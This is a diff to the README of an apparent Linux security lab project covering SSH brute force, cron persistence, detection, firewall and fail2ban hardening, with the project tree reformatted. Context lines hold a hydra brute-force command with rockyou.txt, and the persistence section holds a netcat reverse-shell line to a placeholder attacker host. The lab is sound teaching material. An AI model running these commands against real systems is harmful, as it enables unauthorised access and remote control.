@@ -60,34 +60,34 @@ administration, detection engineering, and incident response.
 ## Project Structure
 
 linux-security-lab/
-│
-├── setup/
-├── attacks/
-│   ├── brute-force.md
-│   └── persistence.md
-│
-├── detection/
-│   ├── log-analysis.md
-│   └── fim-analysis.md
-│
-├── defense/
-│   ├── firewall.md
-│   └── fail2ban.md
-│
-├── validation/
-│   └── results.md
-│
-├── audit/
-│   └── lynis-report.md
-│
-├── screenshots/
-│   ├── day1/
-│   ├── day2/
-│   ├── day3/
-│   ├── day4/
-│   └── day5/
-│
-└── README.md
+
+setup/
+ attacks/
+  brute-force.md
+   persistence.md
+
+    detection/
+    log-analysis.md
+    fim-analysis.md
+
+    defense/
+    firewall.md
+    fail2ban.md
+
+    validation/
+    results.md
+
+    audit/
+    lynis-report.md
+
+    screenshots/
+    day1/
+    day2/
+    day3/
+    day4/
+    day5/
+
+    README.md
 
 --------------------------------------------------
 
@@ -139,6 +139,7 @@ hydra -l secureuser -P rockyou.txt ssh://<target-ip>
 ### Firewall Configuration
 
 sudo ufw allow OpenSSH
+
 sudo ufw enable
 
 ### Fail2Ban Installation
@@ -174,11 +175,12 @@ sudo systemctl restart ssh
 
 crontab -e
 
-* * * * * nc attacker-ip 4444 -e /bin/bash
+nc attacker-ip 4444 -e /bin/bash
 
 ### Detection
 
 crontab -l
+
 ps aux
 
 ### Screenshots
@@ -195,6 +197,7 @@ ps aux
 ### Install
 
 sudo apt install aide
+
 sudo aideinit
 
 ### Simulate Tampering
@@ -225,8 +228,6 @@ hydra -l secureuser -P rockyou.txt ssh://<target-ip>
 ### Screenshots
 
 ![Hydra Attack Blocked](screenshots/day5/hydra-blocked.png)
-
-![Fail2Ban Banned IP Confirmation](screenshots/day5/fail2ban-status.png)
 
 --------------------------------------------------
 
